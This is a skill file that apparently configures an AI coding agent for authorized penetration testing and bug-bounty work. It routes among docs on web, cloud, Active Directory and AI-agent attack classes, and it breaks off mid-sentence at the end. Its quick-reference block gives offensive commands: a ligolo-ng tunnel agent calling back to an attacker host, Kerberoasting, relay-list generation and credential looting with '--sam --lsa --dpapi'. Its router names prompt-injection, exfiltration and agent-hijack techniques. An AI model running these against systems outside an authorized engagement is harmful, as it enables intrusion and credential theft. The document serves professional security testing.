---
name: moraa-ai-offsec-agent
description: "Unified offensive workflow merging web bug-bounty hunting and internal network/AD penetration testing into one engagement-driven flow. Use for ANY offensive task: external recon, web vuln hunting (IDOR/SSRF/XSS/SSTI/JWT/auth bypass/business logic), modern framework misconfig (Next.js/SvelteKit/SPA source-maps/API-gateway/actuator/CORS), WebSocket testing (CSWSH, per-message IDOR, GraphQL subscriptions), cloud pentesting (AWS/Azure/GCP/Aliyun/Tencent/Huawei metadata SSRF, IAM privesc, buckets, secrets), getting a foothold, pivoting/tunneling (ligolo-ng), Active Directory attacks, Windows/Linux privilege escalation, lateral movement, credential access, finding validation, and pentest/CPTS report writing. Drives from a per-target engagement folder with a single auth.json for cookies/tokens/creds. Commands-first. Trigger words: pentest, bug bounty, recon, hunt, foothold, pivot, tunnel, privesc, Active Directory, BloodHound, lateral movement, CPTS, engagement, report, SSRF, websocket, CSWSH, cloud, AWS, Azure, GCP, S3, IAM, metadata, Next.js, Nuxt, SvelteKit, misconfig, SQLi, SSTI, deserialization, file upload, request smuggling, HTTP desync, GraphQL, race condition, open redirect, parameter pollution, mass assignment, RCE, command injection, WordPress, Joomla, Drupal, CMS, JWT, OAuth, ATO, account takeover, password reset, signup, login, MFA bypass, IDOR, XXE, prototype pollution, DOM XSS, source map, JS analysis, DCSync, 403 bypass, Burp, banner grabbing, smart contract, Solidity, Solana, Anchor, reentrancy, flash loan, oracle manipulation, ERC4626, Immunefi, Code4rena, Sherlock, Cantina, CodeHawks, Foundry, Slither, rug pull, meme coin, tokenomics, mobile pentest, APK, Frida, request signing, anti-bot, padding oracle, CSS injection, WAF bypass, CVSS, subdomain takeover, dangling CNAME, Supabase, PostgREST, Row Level Security, RLS, BaaS, Okta,
Entra ID, Azure AD, M365, Office 365, Conditional Access, vCenter, Workspace ONE, VPN appliance,
Cisco ASA, Fortinet, Citrix, Pulse Secure, Ivanti, RAG, vector database, embedding, prompt
injection, MCP, Model Context Protocol, tool poisoning, agentic browser, Claude in Chrome,
Intent Collision, XS-Leaks, cross-site leak, ETag leak, timing oracle."
---

# Moraa — Unified Offensive Workflow

One engine (Claude Code). One engagement folder. External web hunting **and** internal
network/AD pentesting in a single flow. Commands first, explanation second.

> Full design rationale: see `CUSTOM-WORKFLOW.md` in this skill folder.

---

## THE ONE RULE (kills wasted time)

> **"Can an attacker do this RIGHT NOW and cause real harm — stolen money/PII, account
> takeover, code execution, domain compromise?"** If NO → stop, don't write it, move on.
> "Could theoretically…" is not a finding. Prove it with a real request/response or drop it.

And the standing operational rule from the owner: **set up the pivot BEFORE going deeper into
the network.** Never tunnel-blind.

**CORS refinement (2026-09):** a credentialed-CORS finding is a *precondition*, not an endpoint on
its own, unless it independently reaches money/PII/creds AND the delivery vector (same-site XSS/
subdomain-takeover/attacker-controlled subdomain) is already in hand. A CORS misconfig found without
a proven delivery vector is a lead, not a finding — keep hunting for the vector or the class before
writing it up. Don't spend further budget re-confirming CORS reflection once the pattern is
established on one route of a fleet; move on to classes that pay standalone (IDOR, SSRF→creds, auth
bypass, injection, RCE).

---

## 0. ENGAGE — start every job here

When the user names a target (`/moraa-ai-offsec-agent <target>` or "start engagement on X"):

1. **Create / open the engagement folder** (see layout below). Default base:
   `./engagements/<target>/` in the current working dir (or ask the user where).
2. **Read `auth.json`** if present. Apply: set scope, load creds (attacker+victim for IDOR),
   note headers/cookie/bearer. If absent, copy `auth.example.json` → `auth.json` and ask the
   user to fill it.
3. **Ingest `docs/`** — read program policy / scope PDF / API spec / BloodHound zip the user
   dropped in. Confirm every in-scope asset is authorized before touching it.
4. **Pick the track**: external/web target → Phase 1-2. Internal IP/range or "I have a shell"
   → jump to the matching internal phase. State which track and why.
5. **Open `coverage.md`** — this is the running map of what's tested. Update it as you go.

### Engagement folder layout

```
engagements/<target>/
  ENGAGEMENT.md   auth.json   docs/   findings/   coverage.md   recon/  loot/  pivot/  graph/  report/
```

Each engagement folder is self-contained and gitignored (only `_TEMPLATE/` is
tracked). Read its `coverage.md` before re-testing anything: the "Untested" section is
the queue, and KILL/CLEAN verdict files are the do-not-re-propose list.

### auth.json (fill once — your cookies/tokens/creds live here)

```json
{
  "scope":   ["*.target.com", "10.10.10.0/24"],
  "cookie":  "session=PASTE_HERE",
  "bearer":  "eyJ...",
  "headers": ["X-Org-Id: 42"],
  "creds":   [{"user":"low","pass":"...","role":"attacker"},
              {"user":"admin","pass":"...","role":"victim"}],
  "docs":    "docs/"
}
```

Use the loaded auth on every request. For IDOR/access-control: replay account A's requests
with account B's session. Never paste secrets into `findings/` or `report/`.

---

## ROUTER — load the right phase doc

Read the matching file in this skill folder when you enter a phase. Don't dump everything at
once; pull the doc you need.

**Fast pick — route on the first question you'd actually ask:**

- **What KIND of target?** web app → `web-hunt.md` · unknown surface → `recon.md` · cloud estate →
  `cloud.md` · mobile app → `mobile-pentest.md` · smart contracts → `web3-audit.md` · internal IP/range
  or shell in hand → `initial-access.md` then `pivoting.md` (PIVOT BEFORE DEPTH) → `active-directory.md`
- **Do I have credentials/a session?** yes → hunt authz FIRST (`idor-access-control.md`, two accounts) ·
  no → unauth surface (`framework-misconfig.md`, `shadow-api.md`) or get accounts (bughunter STEP 5 stop)
- **Found a parameter?** → `parameter-deep-dive.md` before picking any single class
- **About to trust a signal?** → `controls-and-oracles.md` · **about to write it up?** → `validate.md`
- **Stuck >1h on one path / wondering about another sweep?** → `engagement-ceiling.md`, then switch

| Situation | Read |
|---|---|
| External target, mapping attack surface | `recon.md` |
| Hunting a web vuln class (IDOR, SSRF, XSS, SSTI, JWT, auth, logic, GraphQL…) | `web-hunt.md` |
| **Hunting SSRF** (cloud metadata, filter bypass, blind/OOB incl. cert-CN & error oracles, PDF/webhook/IdP vectors) | `ssrf.md` |
| **DNS rebinding** (the SSRF filter RESOLVES the hostname) — TOCTOU between validate-resolve and fetch-resolve, two-answer attacker DNS, which clients re-resolve vs pool/pin, and the controlled proof that the target actually re-resolves | `dns-rebinding.md` |
| **IDOR / broken access control** (#1 paid class) — two-account method, ID enum, mass-assign, 400-vs-403 trap, search-authz | `idor-access-control.md` |
| **Multi-tenancy / tenant isolation** (SaaS) — where the tenant id hides (path/subdomain/header/JWT claim/body), the 4-cell cross-tenant matrix, shared-resource leakage (search/export/cache/storage/audit), invitation-flow escape, sign-up-your-own-tenant second identity | `multi-tenancy.md` |
| **CORS** (credentialed reflection, bypass table, same-site escape, CSRF-token→ATO, fleet check) | `cors.md` |
| **Signed-URL / signed-cookie mint ungated** (`*/cf_cookie`, `*/presign`, `*/sas`, `*/upload_link`) — mint vs sibling data route, tenant-wide policy, client-controlled scope segment, unbound bearer replay | `signed-url-mints.md` |
| **Server-SIGNED response body** (`X-*-Sig` header + root key pinned in the bundle) — the echoed path param is a chosen-plaintext signing oracle: duplicate-key `"status":"found"` injection, request-binding, client-side expiry/revocation, verify-with-the-attacker's-key | `signed-url-mints.md` -> server-signed response bodies |
| **Pre-prod / dev-stg sibling of an app** (`X.dev.svc`, `X.stg.svc`) — the CloudFront SPLIT-distribution fingerprint (146 B `MissingKey` = default behaviour / 919 B `Request blocked.` = behaviour matched then WAF-blocked / app JSON = origin reached), so 919 B PROVES the route exists and is fenced; then the normalisation matrix with production as the decode control, the 11-header AWS-WAF `ForwardedIPConfig` IP-spoof battery, and the CT `internal-X.svc` ALB SAN for direct-to-origin | `bypass-4xx.md` -> split-distribution fingerprint |
| **Pinned-trust client with a `root: null` / empty env entry** — looks like "verification disabled", almost always FAILS CLOSED (`if(!root) throw`); read the resolver not the table, and grep the bundle for `import.meta`/`searchParams`/`localStorage`/`window.__` to prove whether the alternate env is even selectable at runtime (Vite inlines it) | `controls-and-oracles.md` -> Case 12 |
| **Harvested CloudFront `Key-Pair-Id` in hand, no signature** — replay it across distributions: `InvalidKey` = key groups isolated, ANYTHING ELSE = cross-service signature replay. An EXPIRED signature answers the trust question (key-group check precedes the date check) | `signed-url-mints.md` -> cross-distribution key-group reuse |
| **JWT** (alg:none, RS256→HS256 confusion, kid/jku/jwk, exp/claim tamper, per-service inconsistency, logout non-revoke) | `jwt.md` |
| **Session management** (cookie/session class) — fixation & rotation on privilege change, session puzzling, logout non-invalidation, concurrency, timeouts, cookie scoping/`__Host-`, entropy, and the high-impact test: **sessions surviving password/email/2FA change** | `session-management.md` |
| **Business logic / money bugs** (price/qty/currency manip, coupon stack/reuse, workflow skip, race) | `business-logic.md` |
| **Supply-chain / artifact integrity** (firmware transport+sig, redirect downgrade, package repos, dependency confusion, CI) | `supply-chain.md` |
| **XSS** (context detection, filter/CSP bypass, blind XSS, chain into CORS-trusted origin) | `xss.md` |
| **CSRF** (SameSite interplay, token-validation flaws, auto-submit PoC, CORS-leaks-token→ATO) | `csrf.md` |
| **XXE** (file-read, blind OOB, error-based, SVG/DOCX upload, XXE→SSRF/RCE) | `xxe.md` |
| **Prototype pollution** (`__proto__` injection → RCE/authz-bypass/DOM-XSS gadgets) | `prototype-pollution.md` |
| **CSS injection** (attribute-selector token exfil, opacity clickjacking PoC, `@import` takeover, font char-oracle — survives strict CSP) | `xss.md` § CSS injection |
| **Padding oracle / crypto misuse** (CBC 1-byte-flip, PadBuster, `__VIEWSTATE`→ysoserial.net RCE, ECB/static-IV, base64-as-encryption) | `crypto-padding-oracle.md` |
| **LFI / path traversal** (traversal bypass, PHP wrappers, log/session poisoning→RCE) | `lfi.md` |
| **Command injection** (separators, blind confirm, WAF bypass, argument injection) | `command-injection.md` |
| **NoSQL / LDAP / XPath injection** (operator injection auth-bypass, blind extraction) | `nosql-ldap-xpath-injection.md` |
| **2FA / MFA bypass** (skip-step, OTP brute/reuse, race, per-field step-up gaps) | `2fa-bypass.md` |
| **SAML SSO attacks** (XML signature wrapping, sig-stripping, federation confusion) | `auth-oauth.md` § SAML SSO attacks |
| **Rate-limit bypass** (unlocks OTP/login/coupon brute at scale) | `rate-limit-bypass.md` |
| **Egress filter / DPI bypass** (characterise the block layer — DNS/IP/SNI/Host/proxy — then Tier 1 blocklist-edge wins, Tier 2 ClientHello fragmentation/ECH, Tier 3 TLS tunnels; also the C2/exfil channel-selection pivot) | `egress-filter-bypass.md` |
| **User enumeration** (login/reset/signup/OAuth-linking/SSO-discovery oracles) — body/status/redirect/timing/rate-limit differences, distribution-based timing proof, controls that separate real oracles from noise, and the chain to weak lockout/reset flaws that makes it a real finding | `user-enumeration.md` |
| **ReDoS** (catastrophic backtracking, blind timing confirm) | `redos.md` |
| **Clickjacking / postMessage** (frame overlay PoC; missing `event.origin` check) | `clickjacking.md`, `postmessage.md` |
| **Password-reset flow** (token leak/predict, host poisoning, race, user-id swap) | `auth-oauth.md` § Password reset |
| **Host header injection** (reset-link poisoning, cache poisoning, virtual-host routing SSRF) | `host-header.md` |
| **HTML injection / dangling markup** (raw HTML allowed but `<script>` blocked) | `xss.md` § HTML injection |
| **gRPC API** (reflection/proto discovery, per-RPC authz, metadata-header auth) | `graphql.md` § gRPC |
| **Shadow / zombie API** (undocumented v1, mobile-only, deprecated-but-live routes) | `shadow-api.md` |
| **An OpenAPI/Swagger spec is reachable** (FastAPI/Spring/NestJS `/openapi.json`, `/v3/api-docs`) — read the per-route `security` field as a MISSING-AUTH oracle: rank candidates with ZERO requests to them, hunt the sibling-route SPLIT (5 carry a scheme, 4 omit it = omission = bug; uniform absence = design = no signal), then settle each with a 401-control-beside-200-attack pair. Middleware/prefix-mount auth never appears in the spec, so corroborate both ways | `shadow-api.md` § 2b |
| **CI/CD pipeline** (Jenkins/GH Actions/GitLab CI/Terraform-state exposure → secrets/RCE) | `cicd-attack.md` |
| **Kubernetes attack surface** (exposed kubelet/etcd/dashboard/API-server, SA token theft) | `k8s.md` |
| **Modern SPA / API-gateway target** (Next.js, SvelteKit, React/Vue/Angular, actuator, CORS, authz methodology) | `framework-misconfig.md` |
| **Self-hosted / appliance product whose API you can't authenticate to** (the NMS appliance, GitLab, Mattermost, Nextcloud, network appliances) — pull the vendor's own image with `crane` (no Docker, no root), enumerate every route's `auth:` setting offline, read the handler for each `auth:false`, and grep the bootstrap for `isTest &&`-style conditional plugin registration | `framework-misconfig.md` § "Offline container source review" |
| **Appliance / IoT vendor whose DEVICE-side code you need and whose hardware you do not own** (the auth scheme, the id minting, the signing logic sitting behind a 401 device plane) — try the vendor's **listable, anonymous firmware/package index** before any key-existence oracle: `fw-update.acme-legacy.example/api/firmware?filter=eq~~product~~<name>` returns every build with version/platform/channel/size/sha256 and a direct download href. Then read `dpkg-deb --info`'s **`Depends:` line first** — it names the sibling packages, which is how you find the component you actually want | `framework-misconfig.md` § "Vendor package index" |
| **WebSocket target** (chat, live dash, LLM/agent stream, GraphQL subscriptions) — CSWSH, per-message IDOR, injection | `websocket.md` |
| **Cloud creds in hand / cloud infra target** (AWS/Azure/GCP/Aliyun/Tencent/Huawei) — enum, metadata, IAM privesc, buckets | `cloud.md` |
| **AWS deep-dive** (full IAM shadow-admin table, Lambda/EKS/ECS/Cognito/API-Gateway/Secrets/SNS/SQS per-service attack chains, IMDSv2 bypass nuances) | `cloud-aws.md` |
| **Cloud attack-path engagement** (multi-account estate, creds in hand, graphed paths to crown jewels over flat checklists) — asset graph → path engine → validated paths → blast radius → exec/tech report | `agents/cloud-offensive.md` + `cloud.md`/`cloud-aws.md` |
| **Okta IdP target** (`*.okta.com`, tenant discovery, factor enum, ROPC spray discipline, OIDC redirect_uri tampering, SAML SP misconfig) — red-team/internal only | `okta-attack.md` |
| **Microsoft 365 / Entra ID target** (AADSTS code reference, Smart Lockout math, OneDrive user-enum, Conditional Access bypass options, ROPC/SAML validation) — red-team/internal only | `m365-entra-attack.md` |
| **VMware vCenter / Workspace ONE / Aria target** (external-exposed only) — version fingerprint, pre-auth RCE CVE matrix (21972/21985/22954/34048/37085), MOB/vmdir enum | `vmware-vcenter-attack.md` |
| **Enterprise SSL VPN appliance** (Cisco ASA/Fortinet/Citrix/Palo Alto/Pulse-Ivanti/F5) — vendor fingerprint, pre-auth RCE/file-read CVE matrix, SAML SP check | `enterprise-vpn-attack.md` |
| **RAG / vector-store target** (shared knowledge base, doc-upload-feeds-chatbot, reachable vector-DB port) — persistent corpus poisoning, cross-tenant vector IDOR, metadata leak, retrieval hijack | `rag-vector-attacks.md` |
| **Delegating work to GLM** / which model tier fits a step (and why a subagent cannot BE a GLM model) | `glm-delegation.md` |
| **Handing a hunt to a shell-only agent** (pi/GLM, aider, codex — no MCP client) — fill-in brief: scope confirmation, pre-flight already done, auth state (dead 2nd account = BLOCKED, never faked), Burp via `scripts/burp_bridge.py` not MCP, estate traps, required controls, closing output contract, durable outputs | `delegation-hunt-brief.md` |
| **Orchestrating multiple agents / delegate CLIs** (parallel subagents, background implementers, a delegation that died or "finished" without writing anything) — sequential by default, verify the tree not the self-report, disjoint file sets + one-pass wiring | `fleet-discipline.md` |
| **Running parallel hunt agents / shards on ONE engagement** (who hunts which host; two runs re-doing the same target; concurrent coverage-file writes) — disjoint shard lists at dispatch, `.claims/` lease files, append-only coverage, one merge pass | `work-claims.md` |
| **Burp Suite MCP connected** — replay/tamper/Repeater/Intruder off the live authed session | `burp-mcp.md` |
| **Custom nuclei templates** (write/validate high-signal checks for the classes public sets miss — credentialed-CORS, genuine source maps, SvelteKit `__data.json`, Next.js middleware-bypass probe, actuator/heapdump, edge-block gaps, healthz metadata) + the repo `templates/` dir and `nuclei_wrap.py --local-templates` wiring | `nuclei-templates.md` |
| **Signed/anti-bot request won't replay** (`401 invalid signature`, `403 bot detected`, `sign`/`nonce`/`X-Sensor-Data` field) — packet-first gate, locate→recover→isolate→replay the signer, reach the API behind it | `request-signing.md` |
| **Webhook targets** (signature-gated receivers like `webhooks.*.svc`, and apps delivering webhooks outbound) — signature-missing/weak/algorithm-confusion/wrong-bytes bypass, replay windows, the no-route-oracle ceiling + provider-side path recovery, outbound URL as SSRF, the state-change proof gate | `webhooks-security.md` |
| **Web3 / smart-contract target** (Immunefi/Code4rena/Sherlock/Cantina/CodeHawks) — 10 bug classes (accounting desync, access control, oracle manip, flash loan, ERC4626, reentrancy, sig replay, proxy/upgrade), Foundry PoC required, non-EVM (Solana/CosmWasm/Move) quick ref, stricter submittable gate | `web3-audit.md` |
| **Meme coin / token rug-pull audit** (EVM + Solana) — retained-authority hunt (mint/freeze/blacklist/fee/LP), DEX/LP manipulation, on-chain authority checks with no source | `meme-coin-audit.md` |
| **Mobile app target** (Android/iOS — runtime-first proxy/replay, static secret+endpoint sweep, SSL-pinning bypass, exported-activity/deeplink injection, WebView JS-bridge abuse, OkHttp signer recovery) | `mobile-pentest.md` (deeper platform internals/IPC/biometric edge cases → `offensive-mobile` skill) |
| **Subdomain takeover** — dangling CNAME/NS fingerprint DB, confirm-before-claim discipline, NS-delegation variant | `subdomain-takeover.md` |
| **Supabase / PostgREST / BaaS target** (`*.supabase.co`, anon/service_role JWT, `/rest/v1/`) — RLS read/write bypass, anonymous record forgery, RPC/storage adjacent surfaces | `supabase-baas.md` |
| **LLM/AI feature target** (chatbot, agent, RAG, prompt injection, jailbreak, tool-call abuse) | `offensive-ai-security` skill |
| **AI red teaming on a shipped LLM feature** — indirect/second-order injection, invisible Unicode-Tags payloads that defeat human review, markdown-image & invisible-char exfil with the server-side-hit oracle, memory implants (persistence = the severity multiplier), agent tool/confused-deputy abuse, and the impact gate that separates a real finding from "the model said something bad" | `ai-redteam.md` |
| **MCP (Model Context Protocol) server target** — poisoned tool descriptions, cross-server composition attacks, malicious/compromised published MCP packages, parameter-schema smuggling | `mcp-security.md` |
| **XS-Leaks** (infer a victim's cross-origin login-state/membership without XSS/CORS — timing, ETag, connection-pool side channels) | `xs-leaks.md` |
| **Agentic browser target** (Claude in Chrome, Gemini in Chrome, Comet, Atlas, Copilot Edge — an AI agent browsing with the human's own session) — zero-click "Intent Collision" hidden-content hijack, cross-site credential exfil via agent navigation, OAuth-consent/form-submission hijack | `agentic-browser-hijack.md` |
| **Found a parameter** (query key, JSON/GraphQL input field, path segment, read header) — DEFAULT DRILL: baseline oracle then the full 20-class matrix on that one parameter; includes oracles for masked-error APIs (`data`-key, FORBIDDEN-vs-ISE auth-gate, error-count, malformed-JSON, timing) and bundle-mined input shapes | `parameter-deep-dive.md` |
| **Mass assignment / auto-binding** (BOPLA write half — API6:2019 → API3:2023): set fields the client never sends — role/isAdmin, ownerId/tenantId, price/discount, status/isVerified. Field DISCOVERY (GET/PUT diff, bundles, OpenAPI `readOnly`, GraphQL input types, Arjun/x8), per-framework mechanics (Rails `permit!`/nested empty hash, Laravel `$guarded=[]`, Django `fields='__all__'`, Spring `@ModelAttribute`, Mongoose `strict`, NestJS `whitelist`, ASP.NET overposting, GORM zero-value trap), whitelist bypasses, and the read-back + canary proof that stops the silent-200 false positive | `mass-assignment.md` |
| **Config-poisoning write that returns 200 but achieves nothing** — a handler that does `Model(**body)` RE-CONSTRUCTS and so **wipes every field you omitted** (vs `obj.update()` which merges). Read the object back and diff it to tell the two apart; if a sibling READ route shares the authz gap, that read is the load-bearing primitive — replay all fields, poisoning one | `mass-assignment.md` § partial-write trap |
| **Deep JS analysis** (recon) — secrets, endpoints, source maps, DOM sinks, prototype pollution | `js-analysis.md` |
| **Auth / OAuth / ATO / password-reset / signup-login** hunting | `auth-oauth.md` |
| **Moodle / LMS target** (`MoodleSession`, `M.cfg`) — unauth config dump, exact-version hash-pinning, plugin inventory, enrolment gate, `auth_oauth2` identity-mapping ATO | `cms-moodle.md` |
| **SQLi**, **SSTI**, **file-upload**, **deserialization**, **request-smuggling**, **race**, **graphql**, **open-redirect**, **param-pollution**, **RCE routes**, **CMS**, **4xx bypass** | see `web-hunt.md` table → per-class doc (`sqli.md`, `ssti.md`, `file-upload.md`, `deserialization.md`, `request-smuggling.md`, `race-condition.md`, `graphql.md`, `open-redirect.md`, `parameter-deep-dive.md` § HPP, `rce-scenarios.md`, `cms-wordpress-joomla.md`, `cms-moodle.md`, `bypass-4xx.md`) |
| **DCSync / AD credential extraction** (have replication rights) | `active-directory.md` § DCSync |
| Got creds/RCE on a web app, going internal | `initial-access.md` |
| **Need to reach an internal subnet / tunnel** | `pivoting.md` ← do this BEFORE going deeper |
| Domain-joined host, AD enumeration & attack paths | `active-directory.md` |
| Shell on Windows, need SYSTEM/admin | `privesc-windows.md` |
| Shell on Linux, need root | `privesc-linux.md` |
| Have creds/hash, moving host-to-host | `lateral-movement.md` |
| Cracking hashes / spraying / harvesting creds | `credential-access.md` |
| Need to move a file to/from a victim | `cheatsheet.md` § File transfer |
| Establishing persistence / cleaning up | `active-directory.md` § Persistence & cleanup |
| Need the fastest command for a step (exam speed) | `cheatsheet.md` |
| Reverse shell / TTY upgrade / encoding a payload | `payloads/reverse-shells.md` |
| Setting up my Kali/WSL toolbox | `loadout.md` |
| **About to trust a signal** (fuzz hits, S3 403s, OOB negatives, CT names, saved `-o` output, **an OOB hit you are about to call SSRF**) — six real false positives, one cause: uncontrolled oracles; incl. unpollable pasted Collaborator payloads and DNS 0x20 case randomisation | `controls-and-oracles.md` |
| **Wondering whether to run another sweep** — telling "not looked hard enough" from "structurally blocked": how to state a ceiling (missing primitive / what unblocks / what it caps), when to stop and escalate, and the inverse trap of claiming a ceiling without a class-by-class negative | `engagement-ceiling.md` |
| About to write up a finding | `validate.md` (gate) then `reporting.md` |
| **Wrapping up an engagement (DEFAULT final step)** — publish the Notion page tree: root -> Summary -> Coverage Matrix -> one subpage per subdomain -> one subpage per finding -> PoC subpage. Generate with `scripts/notion_export.py`, never hand-build | `reporting.md` § "Notion documentation" |

## MANUAL-ONLY — never auto-load these

These classes are **off the router by design**. Do NOT load, route to, or hunt these classes unless
the user names the class or the doc explicitly in the current request. Treating them as "one more
checklist item" is exactly the behaviour this section exists to prevent — they are deliberately
absent from the ROUTER table above and from the `web-hunt.md` class table.

| Class | Doc | Load ONLY when the user says |
|---|---|---|
| CAPTCHA bypass | `captcha-bypass.md` | "captcha", or names the file |
| Web cache poisoning / deception | `web-cache.md` | "cache poisoning", "cache deception", or names the file |

Tooling under the same rule: `scripts/cache_probe.sh` (and `tests/test_cache_probe.py`) — do not run
the cache prober unless the user asked for cache work.

Prose cross-references to these two docs still exist elsewhere in the library (`README.md`,
`AGENTS.md`, `host-header.md`, `framework-misconfig.md`). **This section overrides them.** Seeing the
filename mentioned in another doc is not the user asking for the class.


For deep per-vuln-class specifics, the older packs are still on disk and richer in places —
reference them: `knowledge/bug-bounty/skills/` and the `offensive-*.md` files (e.g.
`knowledge/offensive/offensive-active-directory.md`, `knowledge/offensive/offensive-ssrf.md`). Moraa is the orchestration layer;
those are the encyclopedias.

---

## AGENTS — specialists you can hand off to

Beyond the three primary agents (`bughunter` deep-hunt, `recon` breadth, `pentest` coverage),
one domain specialist and two discipline-moment specialists:

| Agent | Hand off when |
|---|---|
| `cloud-offensive` | The target is a cloud estate (AWS/Azure/GCP/multi-account) and you want **graphed attack paths to crown jewels**, not a flat misconfig checklist — it builds the asset graph (Discovery ∥ Identity sweeps), runs the path engine, proves every hop through the Initial-Access/Priv-Esc/Lateral tracks, models blast radius, and delivers executive + technical reports. |
| `validator` | You have a candidate finding and want an independent PASS/KILL[Q#]/DOWNGRADE/CHAIN-REQUIRED call before writing `findings/<slug>.md` — catches self-fooling on IDOR (Q8 identity check) especially. |
| `chain-builder` | You have a confirmed bug A that's low/medium alone (or on the always-rejected list) and want it systematically chained to B/C via the A→B table, proven end-to-end, not hand-waved. |

The validator and chain-builder are cheap second opinions — use them on anything you're about to
submit, not just the ones you're unsure of; a false "PASS" from your own hunting momentum is the
expensive mistake.

---

## TRIAGE — paste what you see, I jump to the next move

When the user pastes tool output, don't summarize it — **identify the single highest-value next
action** and give the command. Pattern → reaction:

| You paste… | I immediately… |
|---|---|
| `nmap` output | Call out the 2-3 juiciest ports, give the exact next enum command per service (445→`nxc smb`, 80→`feroxbuster`/`whatweb`, 88/389→AD track, 3389→creds spray, 1433/3306→db), then route. |
| `whoami /priv` (Windows) | Scan for SeImpersonate/SeBackup/SeDebug etc. → name the exact Potato/exploit and command (`privesc-windows.md`). |
| `sudo -l` (Linux) | Match each entry to a GTFOBins escape or LD_PRELOAD/LD path and give the one-liner (`privesc-linux.md`). |
| winPEAS / linPEAS dump | Surface ONLY the red/critical lines (creds, weak ACLs, SUID, AlwaysInstallElevated, tasks) — ignore noise. |
| BloodHound path / edge | Read the edge, give the abuse command chain to the next node (`active-directory.md`), say "mark owned, re-collect". |
| `nxc` sweep showing `(Pwn3d!)` | That host = local admin → loot it (`--sam --lsa --dpapi`) then move (`lateral-movement.md`). |
| Hash (NTLM/Kerberos/web) | Identify type, give the exact `hashcat -m <mode>` line (`credential-access.md`). |
| HTTP request/response | Spot the vuln signal, give the A→B chain test (`web-hunt.md`), then `validate.md` before reporting. |
| "I have a shell as X on Y" | State the privesc checklist for that context in priority order, and check for a second NIC → pivot first. |

Rule: **always end a triage with the single command to run next**, not a menu. If two paths tie,
pick the one with the highest impact-per-effort and say why in one line.

---

## The merged kill chain (where everything fits)

```
EXTERNAL                                        INTERNAL
recon → web-hunt → [foothold] ──► initial-access → PIVOT → AD enum → privesc → lateral → DA
   │         │                          │            │        │         │         │       │
   └─────────┴──── validate ◄───────────┴────────────┴────────┴─────────┴─────────┴───────┘
                       │
                    report  (assemble from findings/)
```

Web track and internal track share the same `findings/` and `validate.md` gate. A web bug that
yields creds/RCE is a *foothold* — pivot from it; don't stop at "reported the bug."

---

## Findings discipline (PentesterFlow idea, Claude-native)

Every confirmed issue → one file `findings/<slug>.md`:

```markdown
# <Title: class in endpoint/host → impact>
- Severity: critical|high|medium|low|info   (CVSS if web)
- Asset: <url or host/ip>   Method/Param: <...>
## Evidence
<exact request + response excerpt proving it — not just a 200>
## Reproduce
<copy-paste curl / command>
## Impact
<concrete: what attacker gains, who is affected, $ / PII / DA>
## Remediation
<1-2 sentences>
```

Update `coverage.md` after each pass so you (and `/next`) know what's untested:

```markdown
## Coverage
- [x] /api/orders/{id}  — IDOR — CONFIRMED (findings/idor-orders.md)
- [x] /api/users/{id}   — IDOR — tested, authz enforced
- [ ] /api/invoices/{id} — IDOR — UNTESTED  ← next
- [ ] 10.10.10.0/24 hosts 5-20 — UNTESTED
```

When asked "what's next?", read `coverage.md` + `findings/`, then propose the highest-value
untested item (crown-jewel × easiest entry).

---

## Phase quick-reference (the one-liners that matter)

```bash
# RECON (external) — full flow in recon.md (multi-source subs, crt.sh, favicon-hash, GitHub, DNS brute, fuzz)
subfinder -d TARGET -all -recursive -silent | anew subs.txt
curl -sk "https://crt.sh/?q=%25.TARGET&output=json" | grep -oiE '[a-z0-9_*.-]+\.TARGET' | sort -u | anew subs.txt
puredns bruteforce httparchive_subdomains_*.txt TARGET -r resolvers.txt | anew subs.txt   # assetnote list
cat subs.txt | dnsx -silent | httpx -silent -sc -title -td -ip -favicon -o live.txt        # favicon mmh3 hash
ffuf -w Fuzz_all.txt -u https://HOST/FUZZ -ac -mc all                                      # content fuzz
nuclei -l live.txt -severity critical,high,medium -o nuclei.txt

# RECON (internal, once you have a foothold)
nmap -sC -sV -oA recon/initial <target>
nxc smb 10.10.10.0/24            # host discovery + SMB signing
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt

# PIVOT (ligolo-ng — default; see pivoting.md)
# attacker:  ./proxy -selfcert -laddr 0.0.0.0:11601
# victim:    ./agent -connect ATTACKER:11601 -ignore-cert
# ligolo:    session → start → ip route add 10.10.10.0/24 dev ligolo

# AD (see active-directory.md)
bloodhound-python -d corp.local -u user -p pass -ns DC_IP -c All --zip
nxc ldap DC -u user -p pass --kerberoasting kerb.txt
certipy find -u user@corp.local -p pass -dc-ip DC_IP -vulnerable -stdout

# PRIVESC checks (see privesc-*.md)
# win:   winpeas.exe / whoami /priv / SeImpersonate? AlwaysInstallElevated? unquoted svc?
# linux: sudo -l ; find / -perm -4000 2>/dev/null ; linpeas.sh
```

---

## Operating principles

1. Commands first. The user is often in exam/live mode — give the action, then a one-line why.
2. No theoretical bugs. Real PoC + concrete impact, or it doesn't go in `findings/`.
3. Pivot before depth. Establish the tunnel before enumerating a deeper subnet.
4. One bug class at a time, go deep (web). One attack path at a time, validate each hop (AD).
5. Track coverage. Don't re-test what's done; don't forget what's untested.
6. Start the report Day 1 (CPTS rule) — `findings/` *is* the report in progress.
7. When stuck >1 hour on one target/path, switch context.
8. **Model-tier the work.** Mechanical/high-volume/low-reasoning steps (content/param fuzzing,
   subdomain resolution, JS-bundle grepping, wordlist-driven enumeration, dorking sweeps) run fine
   on `sonnet`/`haiku` — cheap and fast, the `recon` agent defaults to `sonnet` for this reason.
   Reasoning-heavy steps (business-logic chains, auth/authz methodology, chaining A→B, exploit
   construction, writing findings) run on `opus` — the `bughunter`, `chain-builder`, and
   `cloud-offensive` agents default to it. Rule-application steps (running the 7-Question Gate against a described
   finding) are mechanical enough for `sonnet` — the `validator` agent defaults to it. When
   orchestrating multiple agents on one target, split recon/fuzz/validation (cheap model) from
   exploitation/chaining (opus) rather than running everything on the expensive model.

<!-- router additions — r4 L1, 2026-10-15 -->
- **socket.io / engine.io mounted on a REST or SPA backend** (unauth namespace connect, per-message
  authz, id-keyed channels with no room join, accept-then-drop ambiguity) -> `websocket.md`
  § "socket.io on a REST host".
- **NestJS / class-validator API, before any injection payload** (empty-body DTO contract
  disclosure, `ParseUUIDPipe` fence + its discriminating error strings, `forbidNonWhitelisted`
  probe as the mass-assignment precondition, JSON-body duplicate-key = last-value-wins vs query
  first-value-wins) -> `parameter-deep-dive.md` § "NestJS / class-validator".
- **"No source maps" recorded from a bare-curl 403/404** -> re-check with a browser User-Agent,
  `js-analysis.md` § "Trap: a bare curl gets 403".
- **A 5xx window mid-sweep, or a host where unknown routes return the same code as the auth gate**
